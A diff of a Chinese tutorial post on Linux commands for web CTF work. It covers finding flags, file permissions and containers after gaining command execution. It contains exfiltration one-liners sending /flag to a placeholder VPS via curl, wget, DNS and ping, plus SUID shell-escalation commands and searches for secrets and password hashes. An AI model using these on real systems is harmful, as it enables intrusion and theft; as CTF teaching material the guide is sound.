@@ -1,5 +1,4 @@
 ---
-
 title: Linux 基础知识
 date: 2026-07-15
 categories: [web安全, 常用命令]
@@ -8,557 +7,611 @@ type: tech
 permalink: /web-security/commands/linux
 ---
 
+# Linux 基础知识（CTF 实战版）
 
+> 做 Web CTF 经常需要进到服务器里找 flag。Linux 命令不用全学，掌握这里列的就够用。
 
+---
 
-# 1. Linux 基础知识
+## 场景：拿到 RCE 后怎么办？
 
-做 Web CTF 题目经常会进到服务器里找 `flag，Linux `命令行是必备技能。这里只保留 CTF 中最常用的部分——看文件、找路径、理解权限。
+假设你通过命令注入拿到了服务器执行权限，输入 `whoami` 返回 `www-data`。接下来呢？
 
-## 1.1 Linux 常见目录
-
-Linux 中很多目录都有固定用途，做 Web CTF 时经常需要看文件路径、源码路径和敏感文件路径。
-
-常见目录如下：
-
-| 目录            | 说明                             |
-| --------------- | -------------------------------- |
-| `/`             | 根目录，所有文件都在这个目录下面 |
-| `/home`         | 普通用户目录                     |
-| `/root`         | root 用户目录                    |
-| `/tmp`          | 临时文件目录                     |
-| `/var`          | 存放日志、网站文件、缓存等内容   |
-| `/var/www/html` | 常见 Web 网站根目录              |
-| `/etc`          | 系统配置文件目录                 |
-| `/proc`         | 进程和系统信息目录               |
-
-例如：
-
-```text
-/var/www/html/index.php
+```
+1. 看看在哪：pwd
+2. 看看有啥：ls -la
+3. 找 flag：find / -name "*flag*" 2>/dev/null
+4. 读 flag：cat /flag
+5. 权限不够？ls -l /flag → 看是谁的、什么权限
 ```
 
-表示 Web 网站目录下的 `index.php` 文件。
+---
 
-## 1.2 Linux 常用命令
+## 一、核心目录速查
 
-Linux 命令常用于查看文件、执行命令、寻找 flag 和调试环境。
+| 目录 | 是什么 | CTF 中的意义 |
+|:----:|--------|:-----------:|
+| `/` | 根目录 | 一切的起点 |
+| `/flag`、`/flag.txt`、`/readflag` | CTF 常见 flag 位置 |  第一目标 |
+| `/var/www/html` | Apache 默认网站根目录 | 源码在这里 |
+| `/usr/share/nginx/html` | Nginx 默认目录 | 同上 |
+| `/app` | Docker 容器常见项目目录 | 容器题的源码位置 |
+| `/tmp` | 临时目录 |**可写！**常用于上传文件 |
+| `/dev/shm` | 共享内存（也是可写目录） | 比 /tmp 更快 |
+| `/etc/passwd` | 系统用户信息 | 验证路径穿越 |
+| `/etc/shadow` | 密码哈希 | 需要 root 权限 |
+| `/proc/self/environ` | 当前进程环境变量 | 可能含密钥 |
+| `/proc/1/cgroup` | 容器信息 | 判断是否在 Docker 里 |
+| `/proc/self/cmdline` | 当前进程启动命令 | 看看服务怎么启动的 |
+| `/root/.bash_history` | root 的命令历史 | 可能泄露密码/路径 |
+| `/home/*/.bash_history` | 普通用户命令历史 | 同上 |
+| `/.dockerenv` | Docker 标记文件 | 存在 = 在容器中 |
+| `/proc/self/status` | 进程状态信息 | 查看 Capabilities |
 
-常见命令如下：
+---
 
-| 命令     | 说明             |
-| -------- | ---------------- |
-| `ls`     | 查看当前目录文件 |
-| `pwd`    | 查看当前所在路径 |
-| `cd`     | 切换目录         |
-| `cat`    | 查看文件内容     |
-| `head`   | 查看文件开头内容 |
-| `tail`   | 查看文件结尾内容 |
-| `find`   | 查找文件         |
-| `grep`   | 搜索文件内容     |
-| `id`     | 查看当前用户身份 |
-| `whoami` | 查看当前用户名   |
-| `env`    | 查看环境变量     |
+## 二、常用命令速查
 
-例如：
+### 2.1 文件与目录操作
 
 ```bash
-cat /flag
+ls                  # 列出当前目录
+ls -la              # 列出所有文件（含隐藏文件）+ 详细权限
+ls -la /var/www/    # 列出指定目录
+pwd                 # 显示当前所在路径
+cd /var/www/html    # 切换目录
+cd ..               # 返回上一级
 ```
 
-表示查看 `/flag` 文件内容。
+**ls 命令详细参数**：
 
-## 1.3 文件权限
+| 参数 | 作用 | 示例 |
+|:----:|:----:|:----:|
+| `-l` | 详细列表（权限、所有者、大小、时间） | `ls -l` |
+| `-a` | 显示隐藏文件（以 `.` 开头的文件） | `ls -la` |
+| `-h` | 人类可读的文件大小（KB, MB） | `ls -lh` |
+| `-t` | 按修改时间排序 | `ls -lt` |
+| `-r` | 反向排序 | `ls -ltr` |
+| `-S` | 按文件大小排序 | `ls -lS` |
+| `-R` | 递归列出子目录 | `ls -lR` |
 
-Linux 文件权限用于控制一个文件或目录能不能被读取、写入和执行。
-
-### 1.3.1 查看当前用户身份
-
-常用命令：
+### 2.2 查看文件内容
 
 ```bash
-whoami
+cat /flag                     # 查看文件全部内容（最常用）
+head -20 /etc/passwd          # 只看前 20 行
+tail -30 /var/log/apache2/access.log  # 只看最后 30 行
+strings 二进制文件 | head -50          # 从二进制中提取可读文本
+tac /flag                     # 反向显示（cat 倒过来）
+nl /flag                      # 显示行号
+less /flag                    # 分页查看（适合大文件）
+more /flag                    # 分页查看（更简单的版本）
 ```
 
-例如返回：
+### 2.3 搜索——CTF 核心技能
 
-```txt
-www-data
-```
+#### 按文件名搜索（find）
 
-表示当前用户是 `www-data`，这通常是 Apache / Nginx / PHP-FPM 这类 Web 服务常见的运行用户。
+| 命令 | 作用 |
+|:----|:----|
+| `find / -name "flag*" 2>/dev/null` | 全盘搜索 flag 开头的文件 |
+| `find / -name "*.txt" 2>/dev/null` | 搜索所有 txt 文件 |
+| `find / -name "*conf*" 2>/dev/null` | 搜索配置相关文件 |
+| `find / -size -200c 2>/dev/null` | 搜索小于 200 字节的文件 |
+| `find / -mtime -1 2>/dev/null` | 搜索最近 24 小时内修改的文件 |
+| `find / -perm -4000 -type f 2>/dev/null` | 搜索 SUID 文件（提权） |
+| `find / -perm -2000 -type f 2>/dev/null` | 搜索 SGID 文件 |
+| `find /var/www/ -name "*.php" 2>/dev/null` | 搜索 Web 目录下所有 PHP 文件 |
+| `find / -writable -type f 2>/dev/null` | 搜索可写的文件（权限绕过） |
+| `find / -readable -type f 2>/dev/null \| head -20` | 搜索可读的文件 |
 
-也可以使用：
+**find 的参数组合**：
 
 ```bash
-id
+# 按类型搜索
+find / -type f          # 只搜索普通文件
+find / -type d          # 只搜索目录
+
+# 按权限搜索
+find / -perm -4000      # 包含 SUID（4xxx）
+find / -perm -2000      # 包含 SGID（2xxx）
+find / -perm -6000      # 包含 SUID + SGID
+find / -perm /4000      # 任一用户含 SUID
+
+# 按时间和大小组合
+find / -mmin -10                         # 10分钟内修改
+find / -size +100M -size -200M           # 100MB~200MB之间
+find / -name "*.log" -mtime -7           # 7天内修改的日志
 ```
 
-例如返回：
+#### 按内容搜索（grep）
+
+| 命令 | 作用 |
+|:----|:----|
+| `grep -r "flag{" /var/www/html/ 2>/dev/null` | 递归搜索包含 flag{ 的文件 |
+| `grep -r -E "(password\|secret\|key)" /var/www/ 2>/dev/null` | 搜索敏感关键词 |
+| `grep -r "flag{" /tmp/ 2>/dev/null` | 临时目录也不放过 |
+| `grep -rn "flag{" / 2>/dev/null` | 显示行号 |
+| `grep -ril "flag{" / 2>/dev/null` | 只显示文件名（不显示内容） |
+| `grep -r "<?php" /var/www/ 2>/dev/null` | 搜索 PHP 文件 |
+
+**grep 常用参数**：
+
+| 参数 | 作用 | 示例 |
+|:----:|:----:|:----:|
+| `-r` | 递归搜索 | `grep -r "flag{" /` |
+| `-i` | 忽略大小写 | `grep -ri "flag" /` |
+| `-n` | 显示行号 | `grep -rn "key" /` |
+| `-l` | 只显示文件名 | `grep -rl "flag{" /` |
+| `-E` | 使用扩展正则 | `grep -rE "flag\|secret\|key" /` |
+| `-w` | 匹配完整单词 | `grep -rw "admin" /` |
+
+#### 组合搜索（管道）
 
 ```bash
+find / -name "*.txt" 2>/dev/null | xargs grep "flag{" 2>/dev/null
+cat /etc/passwd | grep -E "bash|sh$"                  # 找有 shell 权限的用户
+ls -la /var/www/html/ | grep "flag"                    # 在文件列表里搜
+ps aux | grep "flag"                                   # 找进程中的 flag
+```
+
+### 2.4 当前用户信息
+
+```bash
+whoami          # 我是谁 → 如 www-data
+id              # 详细信息 → uid、gid、所有用户组
+env             # 所有环境变量（重点关注 SECRET、PASSWORD、FLAG）
+sudo -l         # 我能用 sudo 执行什么？（提权关键！）
+```
+
+#### id 命令输出详解
+
+```bash
+$ id
 uid=1000(www-data) gid=1000(www-data) groups=1000(www-data),27(sudo)
 ```
 
-对应含义：
+| 输出部分 | 含义 |
+|:--------:|:----:|
+| `uid=1000(www-data)` | 用户 ID 和用户名 |
+| `gid=1000(www-data)` | 主组 ID 和组名 |
+| `groups=1000(www-data),27(sudo)` | 所属的所有组（sudo 组可提权） |
 
-| 内容                             | 说明                                                         |
-| -------------------------------- | ------------------------------------------------------------ |
-| `uid=1000(www-data)`             | 当前用户是 `www-data`，它的用户编号是 `1000`                 |
-| `gid=1000(www-data)`             | 当前用户的主用户组是 `www-data`，组编号是 `1000`             |
-| `groups=1000(www-data),27(sudo)` | 当前用户属于的所有用户组，这里当前用户属于两个组：`www-data` 组和 `sudo` 组 |
-
-### 1.3.2 查看某个文件的权限
-
-如果已经知道文件路径，可以直接使用 `ls -l` 查看这个文件的详细权限信息。
-
-常见命令：
+### 2.5 网络相关
 
 ```bash
-ls /flag -l
+# 查看网络连接和监听端口
+netstat -tulpn                     # 列出所有监听端口
+ss -tulpn                          # 现代版 netstat
+
+# 查看网络接口
+ip addr                            # IP 地址信息
+ifconfig                           # 旧版
+
+# DNS 查询
+host target.com                    # 域名解析
+nslookup target.com                # 详细 DNS 查询
+
+# HTTP 请求
+curl -v http://target/             # 发送 HTTP 请求
+wget -O- http://target/            # 下载到 stdout
 ```
 
-参数含义：
-
-| 内容    | 说明                   |
-| ------- | ---------------------- |
-| `ls`    | 查看文件或目录         |
-| `/flag` | 要查看权限的目标文件   |
-| `-l`    | 以详细格式显示文件信息 |
-
-执行后可能返回类似：
-
-```txt
--rw-r--r-- 1 root root 16 Jan 30 00:31 /flag
-```
-
-这行内容可以拆成：
-
-| 部分       | 示例           | 说明                               |
-| ---------- | -------------- | ---------------------------------- |
-| 文件权限   | `-rw-r--r--`   | 表示这个文件的权限                 |
-| 链接数     | `1`            | 有多少个文件名指向同一个文件内容。 |
-| 文件所有者 | `root`         | 这个文件属于哪个用户               |
-| 文件所属组 | `root`         | 这个文件属于哪个用户组             |
-| 文件大小   | `42`           | 文件大小，单位是字节               |
-| 修改时间   | `Jan 30 00:31` | 文件最后修改时间                   |
-| 文件名     | `/flag`        | 文件路径                           |
-
-### 1.3.3 权限格式
-
-使用 `ls -l` 查看文件权限时，最前面会出现一串权限字符。
-
-例如：
-
-```txt
--rw-r--r-- 1 root root 16 Jan 30 00:31 /flag
-```
-
-其中主要看最前面的：
-
-```txt
--rw-r--r--
-```
-
-这一串一共有 10 位，可以拆成 4 个部分：
-
-```txt
--   rw-   r--   r--
-```
-
-对应含义如下：
-
-| 位置       | 示例  | 说明             |
-| ---------- | ----- | ---------------- |
-| 第 1 位    | `-`   | 文件类型         |
-| 第 2-4 位  | `rw-` | 文件所有者的权限 |
-| 第 5-7 位  | `r--` | 文件所属组的权限 |
-| 第 8-10 位 | `r--` | 其他用户的权限   |
-
-第一位表示文件类型，常见情况如下：
-
-| 字符 | 说明     |
-| ---- | -------- |
-| `-`  | 普通文件 |
-| `d`  | 目录     |
-| `l`  | 软链接   |
-
-例如：
-
-```
--rw-r--r-- 1 root root 16 Jan 30 00:31 /flag
-```
-
-开头是 `-`，说明 `/flag` 是一个普通文件。
-
-```
-drwxr-xr-x 1 root root 4096 Jan 30 00:31 /tmp
-```
-
-开头是 `d`，说明 `/tmp` 是一个目录。
-
-后面九位表示权限：
-
-| 权限 | 英文    | 说明         |
-| ---- | ------- | ------------ |
-| `r`  | read    | 读取权限     |
-| `w`  | write   | 写入权限     |
-| `x`  | execute | 执行权限     |
-| `-`  | 无      | 没有这个权限 |
-
-例如：
-
-```txt
-rw-
-```
-
-表示有读取和写入权限，但是没有执行权限。
-
-```txt
-r--
-```
-
-表示只有读取权限，没有写入和执行权限。
-
-```txt
-rwx
-```
-
-表示有读取、写入和执行权限。
-
-所以如果遇到：
-
-```txt
--r-------- 1 root root 16 Jan 30 00:31 /flag
-```
-
-权限部分是：
-
-```txt
--   r--   ---   ---
-```
-
-含义是：
-
-| 用户类型   | 权限  | 说明     |
-| ---------- | ----- | -------- |
-| 文件所有者 | `r--` | 可以读取 |
-| 文件所属组 | `---` | 没有权限 |
-| 其他用户   | `---` | 没有权限 |
-
-这个文件只有所有者 `root` 可以读取。
-
-如果当前用户是 `www-data`，那么执行：
+### 2.6 进程相关
 
 ```bash
+ps aux                             # 查看所有运行进程
+ps aux | grep flag                 # 找含 flag 的进程
+top -bn1                           # 一次性查看进程列表（非交互）
+pgrep -a "python"                  # 按名称查找进程
+```
+
+---
+
+## 三、文件权限——读 flag 经常卡在这里
+
+### 3.1 看懂权限
+
+```bash
+ls -l /flag
+# 输出：-rw-r--r-- 1 root root 42 Jul 22 10:00 /flag
+# ├─┘├─────┤   ├──┘ ├──┘
+# 类型 权限    所有者 所属组
+```
+
+**10 位权限拆解：**
+
+```
+位置： 1   2-4   5-7   8-10
+含义：类型 所有者 所属组 其他人
+示例： -    rw-   r--   r--
+```
+
+| 字符 | 含义 |
+|:----:|:----:|
+| `r` | 可读（read） |
+| `w` | 可写（write） |
+| `x` | 可执行（execute） |
+| `-` | 没有该权限 |
+
+#### 文件类型标志（第 1 位）
+
+| 字符 | 含义 |
+|:----:|:----:|
+| `-` | 普通文件 |
+| `d` | 目录 |
+| `l` | 符号链接 |
+| `s` | Socket |
+| `b` | 块设备 |
+| `c` | 字符设备 |
+
+#### 特殊权限标志（x 位置）
+
+| 位置 | 字符 | 含义 |
+|:----:|:----:|:----:|
+| 所有者 x | `s`（小写） | SUID（文件所有者是 root 时，执行者成 root） |
+| 所有者 x | `S`（大写） | SUID + x 未设置（罕见） |
+| 所属组 x | `s`（小写） | SGID |
+| 所属组 x | `S`（大写） | SGID + x 未设置 |
+| 其他人 x | `t`（小写） | 粘滞位（sticky bit） |
+| 其他人 x | `T`（大写） | 粘滞位 + x 未设置 |
+
+**数字权限速算：** `r=4, w=2, x=1`，相加即可。
+
+| 数字 | 权限 | 含义 |
+|:----:|:----:|:----:|
+| 7 | rwx | 读+写+执行 |
+| 6 | rw- | 读+写 |
+| 5 | r-x | 读+执行 |
+| 4 | r-- | 只读 |
+| 0 | --- | 无权限 |
+
+**4 位数字权限**：
+
+| 数字 | 含义 | 示例 |
+|:----:|:----:|:----:|
+| 4xxx | SUID | `4755` = SUID + rwxr-xr-x |
+| 2xxx | SGID | `2755` = SGID + rwxr-xr-x |
+| 1xxx | Sticky | `1755` = Sticky + rwxr-xr-x |
+| 0xxx | 无特殊 | `0755` = rwxr-xr-x |
+
+### 3.2 权限问题的 CTF 场景
+
+```
+场景1：cat /flag → Permission denied
+       ↓ ls -l /flag
+       -r-------- 1 root root 42 /flag
+       ↓ 只有 root 能读，www-data 不行
+       ↓ 思路：找 SUID 提权 / 换路径 / 用其他漏洞
+
+场景2：rwx 中带 s 标志（SUID）
+       -rwsr-xr-x 1 root root /readflag
+       ↓ 谁执行都临时以 root 权限运行！
+       ↓ /readflag → 直接读到 flag
+
+场景3：查找所有 SUID 文件
+       find / -perm -4000 -type f 2>/dev/null
+
+场景4：查找所有 SGID 文件
+       find / -perm -2000 -type f 2>/dev/null
+```
+
+### 3.3 修改权限
+
+```bash
+chmod +x shell.sh           # 加执行权限
+chmod 777 file.txt          # 所有人可读写执行
+chown www-data:www-data file.txt  # 改所有者:所属组
+```
+
+**chmod 符号模式**：
+
+| 符号 | 含义 |
+|:----:|:----:|
+| `u` | 所有者（user） |
+| `g` | 所属组（group） |
+| `o` | 其他人（other） |
+| `a` | 全部（all） |
+| `+` | 增加权限 |
+| `-` | 删除权限 |
+| `=` | 设置为指定权限 |
+
+示例：
+```bash
+chmod u+x file      # 给所有者加执行权限
+chmod go-w file     # 去掉组和其他人的写权限
+chmod a+x file      # 给所有人加执行权限
+```
+
+---
+
+## 四、管道与重定向详解
+
+### 4.1 管道
+
+管道 `|` 把左边命令的**标准输出**交给右边命令的**标准输入**。
+
+```
+命令1 的标准输出 →|→ 命令2 的标准输入
+```
+
+```bash
+# 基础用法
+cat /etc/passwd | grep root          # 筛选含 root 的行
+ls -la | head -5                     # 只列出前 5 行
+ps aux | grep "www-data"             # 找 www-data 的进程
+
+# 链式管道
+cat /flag | base64                   # 把 flag 转成 base64
+cat /etc/passwd | grep -E "bash|sh"  # 找有 shell 的用户
+find / -name "*.php" | xargs grep "flag{"  # 在 PHP 文件中搜 flag
+```
+
+### 4.2 重定向
+
+| 写法 | 含义 | 内存术语 |
+|:----:|:----:|:--------:|
+| `command > file` | 标准输出 → 覆盖写入文件 | stdout → file |
+| `command >> file` | 标准输出 → 追加写入文件 | stdout → file (append) |
+| `command 2> file` | 标准错误 → 覆盖写入文件 | stderr → file |
+| `command 2>&1` | 标准错误 → 合并到标准输出 | stderr → stdout |
+| `command > /dev/null 2>&1` | 丢弃所有输出 | discard both |
+| `command < file` | 从文件读取输入 | file → stdin |
+| `command << EOF` | Here Document（多行输入） | inline → stdin |
+| `command 1>&2` | 标准输出 → 合并到标准错误 | stdout → stderr |
+
+**详细解释**：
+
+标准输入（stdin）= 文件描述符 0
+标准输出（stdout）= 文件描述符 1
+标准错误（stderr）= 文件描述符 2
+
+```bash
+# 例1：保存结果，忽略错误
+find / -name "flag*" > result.txt 2>/dev/null
+
+# 例2：同时保存 stdout 和 stderr 到不同文件
+find / -name "flag*" > found.txt 2>error.txt
+
+# 例3：同时追加 stdout 和 stderr 到同一文件
+find / -name "flag*" >> all.log 2>&1
+
+# 例4：从文件读取输入
+sort < names.txt
+
+# 例5：Here Document 写入文件
+cat > config.php << 'EOF'
+<?php
+$flag = "flag{test}";
+EOF
+```
+
+### 4.3 CTF 外带数据
+
+```bash
+# 方式1：curl POST 外带
+cat /flag | curl -d @- http://你的VPS/
+
+# 方式2：base64 + curl
+cat /flag | base64 | curl -d @- http://你的VPS/xss.php
+
+# 方式3：wget POST 外带
+cat /flag | base64 | wget --post-data @- http://你的VPS/
+
+# 方式4：DNS 外带（如果 HTTP 被禁）
+cat /flag | base64 | while read line; do host "$line.你的域名" 2>/dev/null; done
+
+# 方式5：ICMP 外带
+cat /flag | xxd -p -c 32 | while read line; do ping -c 1 -p $line 你的VPS; done
+```
+
+---
+
+## 五、CTF flag 搜索实战
+
+### 完整 flag 搜索流程
+
+```bash
+# === 第一优先级：直接读 ===
 cat /flag
+cat /flag.txt
+cat /readflag
+/readflag                     # 可能是 SUID 可执行文件
+
+# === 第二优先级：全盘搜索 ===
+find / -name "*flag*" 2>/dev/null
+find / -name "*flag*" -type f 2>/dev/null  # 只找文件
+find / -name "*flag*" -type f -readable 2>/dev/null  # 只找可读的
+
+# === 第三优先级：搜内容 ===
+grep -r "flag{" / 2>/dev/null
+grep -r "flag{" /var/www/html/ 2>/dev/null
+grep -r "flag" /etc/ 2>/dev/null
+
+# === 第四优先级：搜环境变量 ===
+env | grep -i flag
+env | grep -i secret
+env | grep -i key
+env | grep -i pass
+echo $FLAG
+echo $SECRET
+
+# === 第五优先级：命令历史 ===
+cat ~/.bash_history | grep -i flag
+cat /root/.bash_history 2>/dev/null | grep -i flag
+cat ~/.bashrc | grep -i flag
+
+# === 第六优先级：进程内存 ===
+ps aux | grep flag              # flag 可能在进程命令行中
+cat /proc/*/cmdline 2>/dev/null | grep -i flag
+
+# === 第七优先级：配置文件 ===
+cat /etc/flag.conf 2>/dev/null
+cat /etc/flag 2>/dev/null
+ls -la /etc/ | grep -i flag
+
+# === 特殊：容器环境 ===
+cat /proc/1/cgroup | grep docker    # 判断是否在容器中
+ls -la /.dockerenv 2>/dev/null       # Docker 标记文件
 ```
 
-通常会返回：
+### 判断容器环境
 
-```txt
-Permission denied
+| 检查点 | 命令 | 容器中 | 非容器 |
+|:------:|:----:|:------:|:------:|
+| cgroup | `cat /proc/1/cgroup` | 包含 `docker` | 不含 |
+| dockerenv | `ls /.dockerenv` | 存在 | 不存在 |
+| 主机名 | `hostname` | 通常是容器 ID | 正常名称 |
+| /proc/1/sched | `cat /proc/1/sched` | 名称不同 | `init` 或 `systemd` |
+
+### CTF 常用敏感文件路径
+
+| 路径 | 可能包含的内容 |
+|:----:|:-------------:|
+| `/flag` | 最常见的 flag 位置 |
+| `/flag.txt` | 另一种常见位置 |
+| `/readflag` | 需要执行的 SUID 程序 |
+| `/var/www/html/flag` | Web 目录下的 flag |
+| `/home/ctf/flag` | CTF 用户目录 |
+| `/root/flag` | root 目录下的 flag |
+| `/tmp/flag` | 临时目录 |
+| `/proc/self/fd/1` | 进程的标准输出 |
+| `/var/log/auth.log` | SSH 登录日志（含密码） |
+| `/etc/shadow` | 用户密码哈希 |
+
+---
+
+## 六、SUID 提权速查
+
+### 6.1 什么是 SUID
+
+SUID（Set User ID）是一种特殊权限，当文件设置了 SUID 后，无论谁执行它，都会以**文件所有者**的身份运行。
+
+```
+-rwsr-xr-x 1 root root 31000 /usr/bin/su
+  ↑
+  s = SUID 标志
 ```
 
-### 1.3.4 修改文件权限和属主
-
-如何修改文件权限、文件所有者和文件所属组的常见命令如下：
-
-| 命令    | 作用                                 |
-| ------- | ------------------------------------ |
-| `chmod` | 修改文件权限                         |
-| `chown` | 修改文件所有者，也可以同时修改所属组 |
-| `chgrp` | 修改文件所属组                       |
-
-1. **chmod 修改文件权限**
-
-   `chmod` 用来修改有权限修改的文件或目录的权限。
-
-   1. **数字权限格式：**
-
-      ```bash
-      chmod 权限数字 文件名
-      ```
-
-      例如：
-
-      ```bash
-      chmod 644 /flag
-      ```
-
-      权限数字由 `rwx` 相加得到：
-
-      | 权限 | 数字 |
-      | ---- | ---- |
-      | `r`  | 4    |
-      | `w`  | 2    |
-      | `x`  | 1    |
-
-      所以：
-
-      | 数字 | 权限  | 说明               |
-      | ---- | ----- | ------------------ |
-      | `7`  | `rwx` | 可读、可写、可执行 |
-      | `6`  | `rw-` | 可读、可写         |
-      | `5`  | `r-x` | 可读、可执行       |
-      | `4`  | `r--` | 只读               |
-      | `0`  | `---` | 没有权限           |
-
-      所以：
-
-      ```bash
-      chmod 644 /flag
-      ```
-
-      表示：
-
-      ```txt
-      rw-   r--   r--
-      ```
-
-      也就是文件所有者可以读写，文件所属组和其他用户只能读。
-
-      另外有时会看到四位数字权限，例如：
-
-      ```bash
-      chmod 4755 /readFlag
-      ```
-
-      这里的 `4755` 可以理解成：
-
-      ```bash
-      4 + 755
-      ```
-
-      前面的 `4` 表示 `SUID` 特殊权限，后面的 `755` 表示普通权限。
-
-      设置后可能显示为：
-
-      ```bash
-      -rwsr-xr-x 1 root root 16000 Jan 30 00:31 /readFlag
-      ```
-
-      其中 `rws` 里的 `s` 就表示这个文件带有 `SUID` 权限。
-
-      如果这个文件的所有者是 `root`，普通用户执行它时，程序会临时以 `root` 权限运行，所以 CTF 中经常会通过查找 SUID 文件来尝试读取 flag。
-
-   2. **符号权限格式：**
-
-      ```bash
-      chmod 用户类型 操作符 权限 文件名
-      ```
-
-      用户类型：
-
-      | 符号 | 说明              |
-      | ---- | ----------------- |
-      | `u`  | user，文件所有者  |
-      | `g`  | group，文件所属组 |
-      | `o`  | other，其他用户   |
-      | `a`  | all，所有用户     |
-
-      操作符：
-
-      | 符号 | 说明           |
-      | ---- | -------------- |
-      | `+`  | 增加权限       |
-      | `-`  | 删除权限       |
-      | `=`  | 设置为指定权限 |
-
-      例如：
-
-      ```bash
-      chmod +x shell.sh
-      ```
-
-      表示给 `shell.sh` 增加执行权限。
-
-      等价于写：
-
-      ```bash
-      chmod a+x shell.sh
-      ```
-
-      表示所有用户都增加执行权限。
-
-2. **chown 修改文件所有者**
-
-   `chown` 用来修改有权限修改的文件的所有者。
-
-   常见格式：
-
-   ```bash
-   chown 用户名 文件名
-   ```
-
-   例如：
-
-   ```bash
-   chown root /flag
-   ```
-
-   表示把 `/flag` 的文件所有者改成 `root`。
-
-   修改前可能是：
-
-   ```txt
-   -rw-r--r-- 1 www-data www-data 42 Jun  8 12:00 /flag
-   ```
-
-   修改后变成：
-
-   ```txt
-   -rw-r--r-- 1 root www-data 42 Jun  8 12:00 /flag
-   ```
-
-   这里第一个 `root` 表示文件所有者变成了 `root`。
-
-   `chown` 也可以同时修改文件所有者和文件所属组。
-
-   格式：
-
-   ```bash
-   chown 用户名:用户组 文件名
-   ```
-
-   例如：
-
-   ```bash
-   chown root:root /flag
-   ```
-
-   表示把 `/flag` 的文件所有者和文件所属组都改成 `root`。
-
-   即修改后变成：
-
-   ```txt
-   -rw-r--r-- 1 root root 42 Jun  8 12:00 /flag
-   ```
-
-3. **chgrp 修改文件所属组**
-
-   `chgrp` 用来修改文件所属组。
-
-   常见格式：
-
-   ```bash
-   chgrp 用户组 文件名
-   ```
-
-   例如：
-
-   ```bash
-   chgrp www-data /flag
-   ```
-
-   表示把 `/flag` 的所属组改成 `www-data`。
-
-   即修改后变成：
-
-   ```txt
-   -rw-r----- 1 root www-data 42 Jun  8 12:00 /flag
-   ```
-
-   这里 `/flag` 的所有者还是 `root`，但是所属组变成了 `www-data`。
-
-## 1.4 环境变量
-
-环境变量是系统中保存的一些全局变量，程序运行时可以读取它们。
-
-查看环境变量：
+### 6.2 查找 SUID 文件
 
 ```bash
-env
+# 查找所有 SUID 文件
+find / -perm -4000 -type f 2>/dev/null
+
+# 查找所有 SGID 文件
+find / -perm -2000 -type f 2>/dev/null
+
+# 查找 SUID + SGID
+find / -perm -6000 -type f 2>/dev/null
+
+# 查找当前用户可执行的 SUID
+find / -perm -4000 -type f -executable 2>/dev/null
 ```
 
-常见环境变量如下：
+### 6.3 常见 SUID 提权命令
 
-| 环境变量 | 说明           |
-| -------- | -------------- |
-| `PATH`   | 命令搜索路径   |
-| `USER`   | 当前用户名     |
-| `HOME`   | 当前用户家目录 |
-| `PWD`    | 当前所在目录   |
+| 命令 | 提权方式 | 示例 |
+|:----:|:--------|:----:|
+| `find` | 执行任意命令 | `find / -exec whoami \;` |
+| `vim` / `vi` | 编辑文件 | `vim /etc/passwd` |
+| `nmap` | 执行脚本 | `nmap --script=xxx` |
+| `less` / `more` | 进入 shell | `less /etc/passwd` → `!sh` |
+| `awk` | 执行命令 | `awk 'BEGIN{system("whoami")}'` |
+| `python` | 执行 Python | `python -c 'import os; os.system("/bin/sh")'` |
+| `perl` | 执行 Perl | `perl -e 'exec "/bin/sh";'` |
+| `tcpdump` | 执行命令 | `tcpdump -i lo -w /tmp/pcap` |
+| `cp` | 复制文件 | `cp /flag /tmp/flag` |
+| `base64` | 读文件 | `base64 /flag` |
 
-例如：
+### 6.4 示例：利用 find SUID 提权
 
 ```bash
-echo $PATH
+# 如果 find 有 SUID 权限
+/usr/bin/find /home -exec sh -p \;   # -p 保留提权权限
 ```
 
-表示输出当前系统的命令搜索路径。
-
-## 1.5 管道和重定向
-
-管道和重定向常用于组合命令、保存结果和处理输出。
-
-常见写法如下：
-
-| 写法          | 说明                                 |
-| ------------- | ------------------------------------ |
-| `cmd1 | cmd2` | 把前一个命令的输出交给后一个命令处理 |
-| `>`           | 覆盖写入文件                         |
-| `>>`          | 追加写入文件                         |
-| `<`           | 从文件读取输入                       |
-| `2>&1`        | 把错误输出合并到正常输出             |
-
-例如：
+### 6.5 查询可执行文件的 Capabilities
 
 ```bash
-cat /etc/passwd | grep root
+# 查看某个文件的 capabilities
+getcap /usr/bin/python3
+getcap -r /usr/bin/   # 查看某个目录下所有文件的 capabilities
 ```
 
-表示读取 `/etc/passwd`，然后筛选包含 `root` 的行。
+Capabilities 是更细粒度的权限控制，常见的有：
 
-```bash
-echo "<?php phpinfo(); ?>" > a.php
-```
+| Capability | 作用 | 示例命令 |
+|:----------:|:----:|:--------:|
+| `cap_setuid+ep` | 允许设置用户 ID | 可用来提权 |
+| `cap_net_raw+ep` | 允许原始 socket | `ping` |
+| `cap_dac_override+ep` | 绕过文件权限检查 | 可读任意文件 |
 
-表示把内容写入 `a.php` 文件。
+---
 
-## 1.6 常见敏感文件路径
+## 知识总结
 
-Linux 中有一些文件经常包含敏感信息。
+### 命令速查表
 
-常见敏感文件路径如下：
+| 任务 | 命令 |
+|:----|:----|
+| 列出文件 | `ls -la` |
+| 查看文件 | `cat`、`head`、`tail` |
+| 搜索文件名 | `find / -name "xxx" 2>/dev/null` |
+| 搜索文件内容 | `grep -r "xxx" /path 2>/dev/null` |
+| 我是谁 | `whoami`、`id` |
+| 权限查看 | `ls -l /flag` |
+| SUID 提权 | `find / -perm -4000 2>/dev/null` |
+| 环境变量 | `env`、`env \| grep -i flag` |
+| 容器判断 | `cat /proc/1/cgroup` |
+| 网络监听 | `netstat -tulpn` |
+| 进程列表 | `ps aux` |
+| 从二进制提取文本 | `strings binfile` |
 
-| 路径                    | 说明                         |
-| ----------------------- | ---------------------------- |
-| `/etc/passwd`           | 系统用户信息                 |
-| `/etc/shadow`           | 用户密码哈希，需要高权限读取 |
-| `/proc/self/environ`    | 当前进程环境变量             |
-| `/proc/self/cmdline`    | 当前进程启动命令             |
-| `/root/.bash_history`   | root 用户命令历史            |
-| `/home/*/.bash_history` | 普通用户命令历史             |
-| `/flag`                 | CTF 中常见 flag 路径         |
+### 文件搜索优先级
 
-例如：
+| 优先级 | 方法 | 命令 |
+|:-----:|:----:|:----:|
+| 1 | 直接尝试 | `cat /flag` `cat /flag.txt` `/readflag` |
+| 2 | 按文件名 | `find / -name "*flag*"` |
+| 3 | 按内容 | `grep -r "flag{" /` |
+| 4 | 环境变量 | `env \| grep flag` |
+| 5 | 命令历史 | `cat ~/.bash_history` |
+| 6 | 进程信息 | `ps aux \| grep flag` |
+| 7 | Docker 卷 | `ls /var/lib/docker/volumes/` |
 
-```bash
-cat /etc/passwd
-```
+### 权限数字速算
